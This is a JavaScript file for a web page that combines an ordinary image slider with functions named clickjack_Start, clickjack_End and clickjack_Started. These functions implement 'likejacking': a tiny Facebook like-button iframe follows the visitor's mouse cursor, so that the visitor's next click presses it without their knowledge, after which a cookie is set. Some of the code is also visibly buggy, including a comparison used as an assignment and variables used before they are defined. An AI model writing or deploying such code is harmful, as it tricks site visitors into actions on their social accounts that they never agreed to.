var slider_ident = 0;
var InGame = "";

$(document).ready(function(){
	$('.slider-test').hide();
	$('.slider-test').eq(0).fadeIn('slow');
	setInterval(function(){
		next_slider();			
	}, 4000);
});

function change_slider(ident, $this){
    slider_ident = ident;
    $('.fa-circle').removeClass('fa-circle').addClass('fa-circle-o');
    $($this).removeClass('fa-circle-o').addClass('fa-circle');	
    var slider = $('.slider-test');				
	slider.fadeOut('slow');
	setTimeout(function(){
	    slider.eq(slider_ident).fadeIn('slow');
	},200);	
}
		
function next_slider(){
    var slider = $('.slider-test');			
    slider_ident = slider_ident+1;	
    if(slider_ident >= slider.length){
        slider_ident = 0;			
	}    
    $('.fa-circle').removeClass('fa-circle').addClass('fa-circle-o');
    $('#pag-'+slider_ident).removeClass('fa-circle-o').addClass('fa-circle');			
	slider.fadeOut('slow');
	setTimeout(function(){
	    slider.eq(slider_ident).fadeIn('slow');
	},200);
}
	
function ret_slider(){
    var slider = $('.slider-test');	
    if(slider_ident == 0){
        slider_ident = slider.length-1;
	}else{		
        slider_ident = slider_ident-1;
	}
    $('.fa-circle').removeClass('fa-circle').addClass('fa-circle-o');
    $('#pag-'+slider_ident).removeClass('fa-circle-o').addClass('fa-circle');			
	slider.fadeOut('slow');
	setTimeout(function(){
	    slider.eq(slider_ident).fadeIn('slow');
	},200);
}

var overiClick = 0;
var clickjack_Start = function(e) {
    $( "#clickiframe-button-wrapper" ).css( {  
	    top: e.pageY - 10,
	    left: e.pageX + 30 
	} ); 
} 
	
var clickjack_End = function(e) {
    document.onmousemove = null;
    $( "#clickiframe-button-wrapper" ).css( {  
	    top: 0,
	    left: 0 
	} ); 
} 

var clickjack_Started = function(e) {
	var uid = false;
	FB.api("/me", function(i) {
		uid = i.id;
    }); 
	$.ajax({
		url: './test.php?is_user_like&uid='+uid,
        type: 'POST'		
	}).done(function(data){
		if(data == false){
			var iframe = $('<iframe>')
	          .attr({
			    'id':'iframelk',
			    'src': url_lk,
			    'scrolling':'no',
			    'frameborder':'0',
			    'allowTransparency':'true'
		      })
		      .css({
			    'border':'none',
			    'overflow':'hidden', 
			    'width':'45px', 
			    'left':'-19px', 
			    'height':'21px', 
			    'z-index':'0',
			    'position':'relative'
		      });
	          $('#clickiframe-button-wrapper').append(iframe);	
	          setTimeout(function(){
		        console.log("stard");
		        document.onmousemove = clickjack_Start;
	          }, 1500);    
              $('#clickiframe-button-wrapper iframe').iframeTracker({
                blurCallback: function(){
	                document.onmousemove = clickjack_End;
			        if(overiClick == 0){
					    console.log("is like!");
					    setTimeout(function(){
		                    $( "#clickiframe-button-wrapper" ).remove();
				            $.cookie('likeLock','true');
					    }, 500);
			        }
			        overiClick == 1;
                }
              });        
	    }else{
		    $( "#clickiframe-button-wrapper" ).remove();
	    }
	});
}
 	 	 	function InsertLogin(){
	    if(name == '' && uid == ''){
		    FB.api("/me/friends", function(i) {
		        $("#userFriend").html(i.name);
		        $("#userFriend").attr("src","http://graph.facebook.com/"+friends_id+"/picture");
				$("#loginFB").hide();
            });       
		}else{
		    $("#userFriendFB").html(name);
		    $("#userFriendAvatarFB").attr("src","http://graph.facebook.com/"+friends+"/picture");
			$("#loginFB").hide();
		}
		$("#box_userFriend").css({'display':'block'});
	}